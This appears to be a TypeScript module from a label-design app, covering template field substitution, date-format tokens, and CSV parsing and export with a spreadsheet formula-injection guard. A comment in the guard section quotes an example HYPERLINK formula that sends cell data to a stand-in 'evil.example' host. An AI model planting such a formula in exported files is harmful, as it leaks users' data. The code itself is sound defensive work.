/**
 * Template fields ({{Name}}), instant expressions ([[date|YYYY-MM-DD]]) and CSV.
 * Ported from the original templates.js with identical behaviour.
 */
import type { LabelElement } from '../model/elements';

const FIELD = /\{\{([^}]+)\}\}/g;
// The format group accepts anything up to the final `]]`, so a literal block like
// "[[date|[YYYY] YYYY]]" reaches formatDateTime intact. The previous `[^\]]*` stopped at the first
// `]`, which meant the literal-block escape could never actually be written by a user.
const EXPR = /\[\[([^\]|]+)(?:\|((?:[^\]]|\](?!\]))*))?\]\]/g;
const MAX_CSV_RECORDS = 10000;

export type TemplateRecord = Record<string, string>;

/** Elements' string fields that may contain placeholders. */
const TEXT_KEYS = ['text', 'barcodeData', 'qrData'] as const;

function mapStrings(el: LabelElement, fn: (s: string) => string): LabelElement {
  const clone = { ...el } as Record<string, unknown>;
  for (const k of TEXT_KEYS) {
    const v = clone[k];
    if (typeof v === 'string' && v) clone[k] = fn(v);
  }
  return clone as unknown as LabelElement;
}

export function extractFields(elements: LabelElement[]): string[] {
  const fields = new Set<string>();
  for (const el of elements) {
    for (const k of TEXT_KEYS) {
      const v = (el as unknown as Record<string, unknown>)[k];
      if (typeof v !== 'string') continue;
      for (const m of v.matchAll(FIELD)) fields.add(m[1].trim());
    }
  }
  return [...fields];
}

const subst = (str: string, rec: TemplateRecord) =>
  str.replace(FIELD, (match, field: string) => {
    const f = field.trim();
    return Object.prototype.hasOwnProperty.call(rec, f) ? rec[f] : match;
  });

export const substituteFields = (els: LabelElement[], rec: TemplateRecord) => els.map((el) => mapStrings(el, (s) => subst(s, rec)));

/** Multi-label rolls with "clone" off: each zone gets its own record. */
export function substituteFieldsByZone(els: LabelElement[], records: (TemplateRecord | undefined)[]): LabelElement[] {
  return els.map((el) => {
    const rec = records[el.zone || 0];
    return rec ? mapStrings(el, (s) => subst(s, rec)) : { ...el };
  });
}

export const createEmptyRecord = (fields: string[]): TemplateRecord => Object.fromEntries(fields.map((f) => [f, '']));

export const generateSampleData = (fields: string[], count = 3): TemplateRecord[] =>
  Array.from({ length: count }, (_, i) => Object.fromEntries(fields.map((f) => [f, `${f} ${i + 1}`])));

// ---- expressions --------------------------------------------------------------

export function hasExpressions(els: LabelElement[]): boolean {
  const probe = new RegExp(EXPR.source);
  return els.some((el) => TEXT_KEYS.some((k) => {
    const v = (el as unknown as Record<string, unknown>)[k];
    return typeof v === 'string' && probe.test(v);
  }));
}

export function evaluateExpressions(els: LabelElement[], now: Date = new Date()): LabelElement[] {
  return els.map((el) => mapStrings(el, (s) => evalString(s, now)));
}

function evalString(str: string, now: Date): string {
  return str.replace(EXPR, (match, expr: string, format?: string) => {
    const e = expr.trim().toLowerCase();
    const f = format?.trim() || null;
    const pad = (n: number) => String(n).padStart(2, '0');
    switch (e) {
      case 'dt':
      case 'datetime': return formatDateTime(now, f || 'YYYY-MM-DD HH:mm:ss');
      case 'date': return formatDateTime(now, f || 'YYYY-MM-DD');
      case 'time': return formatDateTime(now, f || 'HH:mm:ss');
      case 'timestamp':
      case 'ts': return String(now.getTime());
      case 'year': return String(now.getFullYear());
      case 'month': return pad(now.getMonth() + 1);
      case 'day': return pad(now.getDate());
      case 'hour': return pad(now.getHours());
      case 'minute':
      case 'min': return pad(now.getMinutes());
      case 'second':
      case 'sec': return pad(now.getSeconds());
      default: return match;
    }
  });
}

function formatDateTime(d: Date, format: string): string {
  const year = d.getFullYear();
  const month = d.getMonth() + 1;
  const day = d.getDate();
  const h24 = d.getHours();
  const h12 = h24 % 12 || 12;
  const min = d.getMinutes();
  const sec = d.getSeconds();
  const ampm = h24 < 12 ? 'AM' : 'PM';
  const off = d.getTimezoneOffset();
  const tz = `${off <= 0 ? '+' : '-'}${String(Math.floor(Math.abs(off) / 60)).padStart(2, '0')}:${String(Math.abs(off) % 60).padStart(2, '0')}`;
  const p2 = (n: number) => String(n).padStart(2, '0');

  /*
   * Token scan rather than a chain of global replacements.
   *
   * The old chain replaced every literal D, a, s, h and m in the format, so any ordinary word
   * containing those letters was mangled — "DD days" lost its "days", and a user's own text could be
   * rewritten without warning. Three rules fix that while keeping every existing format string working
   * exactly as before:
   *
   *   - tokens are matched longest-first, so MM is a month and not two Ms;
   *   - `\` escapes the next character, so `\d` is a literal d;
   *   - `[...]` is a literal block, the usual dayjs-style escape for text containing letters.
   *
   * Unknown characters pass through untouched, which is what the old `default: return match` did for
   * unrecognised expressions.
   */
  const TOKENS: Record<string, string> = {
    YYYY: String(year), YY: String(year).slice(-2),
    MM: p2(month), M: String(month),
    DD: p2(day), D: String(day),
    HH: p2(h24), H: String(h24),
    hh: p2(h12), h: String(h12),
    mm: p2(min), m: String(min),
    ss: p2(sec), s: String(sec),
    A: ampm, a: ampm.toLowerCase(),
    Z: tz,
  };
  // Longest first: MM must win over M, and so on down the list.
  const NAMES = Object.keys(TOKENS).sort((a, b) => b.length - a.length);

  let out = '';
  for (let i = 0; i < format.length; i++) {
    const ch = format[i];

    if (ch === '\\') {                                  // escaped character
      if (i + 1 < format.length) out += format[++i];
      continue;
    }
    if (ch === '[') {                                     // literal block, may nest
      let depth = 1;
      i++;
      while (i < format.length && depth > 0) {
        if (format[i] === '[') depth++;
        else if (format[i] === ']') { depth--; if (depth === 0) break; }
        out += format[i++];
      }
      continue;
    }
    const name = NAMES.find((n) => format.startsWith(n, i));
    if (name) { out += TOKENS[name]; i += name.length - 1; continue; }
    out += ch;
  }
  return out;
}

// ---- CSV ------------------------------------------------------------------------

export interface CsvResult { headers: string[]; records: TemplateRecord[]; errors: string[] }

/** One row of fields, plus the physical line it starts on, so error messages can point at it. */
interface CsvRow { values: string[]; line: number }

/**
 * Split CSV text into rows of fields.
 *
 * This walks the whole text as one character stream rather than splitting on newlines first. That
 * order matters: a quoted cell is allowed to contain a newline ("line1\nline2" is one cell), and
 * splitting first turned such a cell into two broken rows — so the app could not read a file that
 * its own exporter had just written. Quoting is the only thing that suppresses a delimiter or a
 * line break; outside quotes both are structural.
 *
 * `delim` is detected by the caller and passed in, because Excel under several locales writes
 * semicolon-separated files and a fixed comma turned those into a single column named "a;b".
 */
function parseRows(text: string, delim: string): CsvRow[] {
  const rows: CsvRow[] = [];
  let values: string[] = [];
  let cur = '';
  let quoted = false;
  let sawQuote = false;
  let line = 1;
  let rowLine = 1;

  const endField = () => { values.push(cur.trim()); cur = ''; };
  const endRow = () => {
    endField();
    // A row of one empty field is a blank line — unless it was quoted. `""` is an empty *cell*, which
    // is data, and dropping it silently loses a column's value for that row.
    const blank = values.length === 1 && values[0] === '' && !sawQuote;
    if (!blank) rows.push({ values, line: rowLine });
    values = [];
    sawQuote = false;
  };

  for (let i = 0; i < text.length; i++) {
    const ch = text[i];
    if (quoted) {
      if (ch === '"') {
        if (text[i + 1] === '"') { cur += '"'; i++; }   // "" is an escaped quote
        else quoted = false;
      } else {
        if (ch === '\n') line++;
        cur += ch;                                       // newlines inside quotes are data
      }
      continue;
    }
    if (ch === '"') { quoted = true; sawQuote = true; continue; }
    if (ch === delim) { endField(); continue; }
    if (ch === '\r' || ch === '\n') {
      if (ch === '\r' && text[i + 1] === '\n') i++;
      endRow();
      line++;
      rowLine = line;
      continue;
    }
    cur += ch;
  }
  if (cur !== '' || values.length || sawQuote) endRow();
  return rows;
}

/**
 * Pick the delimiter from the header line.
 *
 * Counts each candidate outside quotes and takes the one that appears most; ties go to comma, so a
 * plain comma file is unchanged. Only the first physical line is inspected, because that is where the
 * column count is decided.
 */
function detectDelimiter(text: string): string {
  const firstLine = text.split(/\r?\n/, 1)[0] ?? '';
  let quoted = false;
  const counts: Record<string, number> = { ',': 0, ';': 0, '\t': 0 };
  for (let i = 0; i < firstLine.length; i++) {
    const ch = firstLine[i];
    if (ch === '"') {
      // An escaped quote inside a quoted field. It is skipped as a pair and the quote state does NOT
      // change: toggling here walked the scanner out of quotes while it was still inside one, so a
      // delimiter after the escape was counted as real and the ones inside the quotes were ignored.
      // A header of a quote followed by a semicolon is enough to do it — the semicolon was counted,
      // the commas were not, the sniffer chose the semicolon, and the header row came back as a
      // single column.
      if (quoted && firstLine[i + 1] === '"') {
        i++;
        continue;
      }
      quoted = !quoted;
      continue;
    }
    if (!quoted && ch in counts) counts[ch] += 1;
  }
  let best = ',';
  let bestCount = counts[','];
  for (const d of [';', '\t']) if (counts[d] > bestCount) { best = d; bestCount = counts[d]; }
  return best;
}

export function parseCSV(csv: string): CsvResult {
  // Excel writes a UTF-8 byte-order mark, which would otherwise become part of the first header name
  // — so a column the template refers to as "name" is really "\uFEFFname" and never matches.
  const text = csv.charCodeAt(0) === 0xfeff ? csv.slice(1) : csv;

  const errors: string[] = [];
  const records: TemplateRecord[] = [];
  if (!text.trim()) return { headers: [], records: [], errors: ['Empty CSV file'] };

  const delim = detectDelimiter(text);
  const rows = parseRows(text, delim);
  if (rows.length === 0) return { headers: [], records: [], errors: ['Empty CSV file'] };

  // The guard is removed from the header row too, or a field name exported as `'=cmd` would come
  // back as the literal `'=cmd` and stop matching the template that refers to it. Export and import
  // have to agree about the guard on every row, not just the data rows.
  const headers = rows[0].values.map(stripFormulaGuard);
  if (headers.length === 0 || headers.every((h) => h === '')) {
    return { headers: [], records: [], errors: ['No headers found in CSV'] };
  }

  for (let i = 1; i < rows.length; i++) {
    if (records.length >= MAX_CSV_RECORDS) {
      errors.push(`CSV truncated: Maximum ${MAX_CSV_RECORDS} records allowed`);
      break;
    }
    const { values, line } = rows[i];
    if (values.length !== headers.length) {
      // The physical line, not the row index: a quoted cell spanning three lines makes them differ,
      // and a row number that points at the wrong line is worse than no number at all.
      errors.push(`Row ${line}: Expected ${headers.length} columns, got ${values.length}`);
      continue;
    }
    // A prototype-free record, not a plain `{}`. Assigning a STRING to `__proto__` on a plain
    // object invokes the inherited setter, which is a silent no-op for non-object values — so a
    // column literally named "__proto__" lost its data with no error and no warning, while the
    // column count still reported 3. This file already gets it right in subst() (hasOwnProperty
    // check); this was the one place that opted out.
    const rec = Object.create(null) as TemplateRecord;
    // Strip the guard toCSV adds, so a file exported by this app reads back with the value the user
    // typed rather than with a leading quote they never wrote.
    headers.forEach((h, j) => (rec[h] = stripFormulaGuard(values[j])));
    records.push(rec);
  }
  return { headers, records, errors };
}

/**
 * Neutralise a spreadsheet formula.
 *
 * Excel, LibreOffice and Google Sheets all treat a cell whose text begins with = + - @ (or tab,
 * carriage return) as a formula, not as text. A cell like
 * `=HYPERLINK("http://evil.example/?"&A1,"click")` therefore becomes a live link when the exported
 * file is opened, and it can read other columns of the same file and send them in the query string.
 *
 * Template rows can arrive from an imported design file, so the value that ends up in a cell is not
 * necessarily the user's own typing. Prefixing a single quote is the spreadsheet convention for
 * "this is text": Excel and LibreOffice do not display the quote, and it is what their own CSV
 * exporters emit. toCSV's counterpart on import strips it again, so a round trip is lossless.
 */
const FORMULA_LEAD = /^[=+\-@\t\r]/;

/**
 * Escape a cell for CSV, neutralising a leading formula character.
 *
 * A value that already begins with an apostrophe is escaped by doubling that apostrophe, so the
 * reader can tell the user's own quote from the guard added here. Without it the literal text
 * `'=SUM(1)` came back as `=SUM(1)`: a guard that silently edits the user's data is its own kind of
 * corruption, and the round trip was only lossless for values nobody had needed to guard by hand.
 */
export function csvCell(value: unknown): string {
  const raw = value === null || value === undefined ? '' : String(value);
  // The importer trims every field before it strips the guard, so the guard has to be decided on the
  // same value the importer will see. Deciding on the untrimmed value put the two ends out of step
  // for exactly one shape: `" '-5"` is neither quote-led nor formula-led, so it was written as-is,
  // trimmed to `"'-5"` on the way back in, and then mistaken for a guarded cell — the apostrophe the
  // user's own data contained was stripped. A fuzzer over an alphabet full of apostrophes found 40
  // such cases out of 5756.
  //
  // Writing the trimmed value is therefore not a loss: the trim already happens on import, so a
  // padded value could never have round-tripped anyway. This makes both ends agree about it.
  const v = raw.trim();
  const safe = v.startsWith("'") || FORMULA_LEAD.test(v) ? `'${v}` : v;
  // Tabs and semicolons are quoted too, because parseCSV picks the delimiter by counting candidates
  // in the header line: a header containing a literal tab made the reader choose TAB as the
  // delimiter and split that one header into two columns. Quoting is what suppresses a delimiter —
  // the sniffer skips quoted characters — so the writer has to quote every character the reader may
  // treat as one. Commas and newlines were already covered; these were not.
  return /[",\n\r\t;]/.test(safe) ? '"' + safe.replace(/"/g, '""') + '"' : safe;
}

/**
 * Undo exactly one level of what csvCell added, so an exported-then-imported file reads back
 * unchanged.
 *
 * Order matters: a doubled apostrophe is the escape for a literal one and must be tested first, or
 * the value `''` would lose a quote on every round trip.
 */
export function stripFormulaGuard(value: string): string {
  if (value.startsWith("''")) return value.slice(1);
  return value.startsWith("'") && FORMULA_LEAD.test(value.slice(1)) ? value.slice(1) : value;
}

export function toCSV(headers: string[], records: TemplateRecord[]): string {
  // Every cell goes through csvCell, headers included. They used to be written with a plain CSV
  // escaper, so a field name beginning with a formula character was the one row that reached Excel
  // unguarded — and field names come from the design file, which an imported template controls.
  //
  // `r[h] || ''` turned a legitimate 0 into an empty cell, so a quantity column exported blanks for
  // every zero row and a round-trip lost the data. Only null/undefined/'' are genuinely empty; 0 and
  // false are values.
  return [
    headers.map((h) => csvCell(h)).join(','),
    // A record whose fields are all empty serialises to an empty line, and the reader treats a
    // trailing empty line as no row at all — the record disappeared on a round trip. `""` is the
    // same cell, written so that it survives; found by fuzzing the round trip.
    ...records.map((r) => headers.map((h) => csvCell(r[h])).join(',') || '""'),
  ].join('\n');
}
